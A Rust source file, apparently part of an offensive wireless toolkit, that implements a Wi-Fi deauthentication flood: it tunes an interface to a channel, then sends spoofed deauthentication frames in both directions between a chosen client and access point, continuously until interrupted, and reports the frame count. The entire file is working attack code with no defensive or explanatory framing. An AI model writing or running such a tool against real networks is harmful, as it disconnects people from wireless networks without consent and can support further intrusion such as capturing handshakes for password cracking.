use std::{thread, time::{Duration, Instant}};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use crate::engines::DeauthArgs;
use crate::iface::IfaceManager;
use crate::builders::DeauthFrame;
use crate::sockets::Layer2Socket;
use crate::utils::{CtrlCHandler, Mac};




pub struct Deauthentication {
    builder    : DeauthFrame,
    frms_sent  : usize,
    seq_num    : u16,
    socket     : Layer2Socket,
    ap_mac     : Mac,
    target_mac : Mac,
    delay      : u64,
}


impl Deauthentication {

    pub fn new(args: DeauthArgs) -> Self {
        IfaceManager::set_channel_or_abort(&args.iface, args.channel);
        Self::display_exec_info(&args);

        Self {
            builder    : DeauthFrame::new(args.bssid),
            frms_sent  : 0,
            seq_num    : 1,
            socket     : Layer2Socket::new(&args.iface),
            target_mac : args.target_mac,
            delay      : args.delay,
            ap_mac     : Mac::from_slice(args.bssid.bytes())
        }
    }



    fn display_exec_info(args: &DeauthArgs) {
        println!("[*] IFACE...: {}", args.iface.name());
        println!("[*] BSSID...: {}", args.bssid.to_string());
        println!("[*] TARGET..: {}", args.target_mac.to_string());
        println!("[*] CHANNEL.: {}", args.channel);
    }



    pub fn execute(&mut self) {
        let mut shots = 0u8;
        let running   = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());
        
        let init = Instant::now();
        println!("[+] Sending frames. Press CTRL + C to stop");

        while running.load(Ordering::SeqCst) {
            self.send_frame(self.target_mac, self.ap_mac);
            self.send_frame(self.ap_mac, self.target_mac);
            shots += 2;
            
            if shots >= 128 {
                shots = 0;
                thread::sleep(Duration::from_millis(self.delay));
            }
        }

        let time = init.elapsed().as_secs_f64();
    
        println!("\n[-] Flood interrupted");
        println!("[%] Frames sent: {} in {:.2}", self.frms_sent, time);
    }



    #[inline]
    fn send_frame(
        &mut self, 
        src_mac : Mac, 
        dst_mac : Mac, 
    ) {
        let frame = self.builder.frame(dst_mac, src_mac, self.seq_num);
        
        self.socket.send(frame);
        self.update_seq_num();
        self.frms_sent += 1;
    }



    #[inline]
    fn update_seq_num(&mut self) {
        if self.seq_num >= 4095 {
            self.seq_num = 0;
        }

        self.seq_num += 1;
    }

}



impl crate::EngineTrait for Deauthentication {
    type Args = DeauthArgs;
    
    fn new(args: Self::Args) -> Self {
        Deauthentication::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}